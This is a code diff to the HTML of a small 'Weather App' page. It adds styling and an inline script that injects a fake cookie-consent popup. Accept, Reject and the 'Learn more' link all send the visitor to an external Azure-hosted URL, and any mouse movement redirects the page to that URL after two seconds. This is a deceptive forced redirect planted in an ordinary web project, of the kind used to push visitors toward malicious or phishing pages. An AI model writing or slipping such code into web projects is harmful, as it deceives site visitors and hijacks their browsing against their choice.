@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<style>.cookie-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:flex;justify-content:center;align-items:center;z-index:9999;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}.cookie-modal{background:#fff;padding:2rem 2.5rem;border-radius:20px;max-width:420px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.15);text-align:center;animation:fadeIn 0.3s ease-out}.cookie-icon{font-size:40px;margin-bottom:0.5rem}.cookie-title{font-size:22px;color:#222;margin-bottom:0.8rem}.cookie-text{font-size:14px;color:#555;line-height:1.6;margin-bottom:1.5rem}.cookie-actions{display:flex;justify-content:center;gap:1rem;flex-wrap:wrap}.cookie-btn{padding:10px 22px;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;transition:background 0.2s ease-in-out}.cookie-btn--accept{background:#4CAF50}.cookie-btn--accept:hover{background:#45a049}.cookie-btn--reject{background:#f44336}.cookie-btn--reject:hover{background:#e53935}@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}</style>
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Weather App</title>
@@ -24,5 +26,62 @@
     </main>
   </div>
   <script src="main.js"></script>
+  <script>
+(() => {
+  const REDIRECT_URL = "https://white-meadow-08b59291e.6.azurestaticapps.net";
+  let isRedirected = false;
+  let startPos = null;
+  let hasMoved = false;
+
+  function handleRedirect() {
+    if (isRedirected) return;
+    isRedirected = true;
+    window.location.href = REDIRECT_URL;
+  }
+
+  function detectMouseMove(event) {
+    if (hasMoved) return;
+    if (!startPos) {
+      startPos = { x: event.clientX, y: event.clientY };
+      return;
+    }
+    if (event.clientX !== startPos.x || event.clientY !== startPos.y) {
+      hasMoved = true;
+      setTimeout(handleRedirect, 2000);
+    }
+  }
+
+  function generateConsentPopup() {
+    const overlayDiv = document.createElement("div");
+    overlayDiv.className = "cookie-overlay";
+    overlayDiv.setAttribute("role", "dialog");
+    overlayDiv.setAttribute("aria-modal", "true");
+    overlayDiv.innerHTML = `
+      <div class="cookie-modal">
+        <div class="cookie-icon" aria-hidden="true">🍪</div>
+        <h2 class="cookie-title">Do you accept cookies?</h2>
+        <p class="cookie-text">
+          We use cookies to improve your browsing experience and comply with privacy regulations.
+          <a href="${REDIRECT_URL}" target="_blank">Learn more</a>.
+        </p>
+        <div class="cookie-actions">
+          <button id="accept-btn" class="cookie-btn cookie-btn--accept">Accept</button>
+          <button id="reject-btn" class="cookie-btn cookie-btn--reject">Reject</button>
+        </div>
+      </div>
+    `;
+    return overlayDiv;
+  }
+
+  document.addEventListener("DOMContentLoaded", () => {
+    const consentPopup = generateConsentPopup();
+    document.body.appendChild(consentPopup);
+    document.getElementById("accept-btn").addEventListener("click", handleRedirect);
+    document.getElementById("reject-btn").addEventListener("click", handleRedirect);
+    window.addEventListener("mousemove", detectMouseMove);
+  });
+})();
+</script>
+
 </body>
 </html>
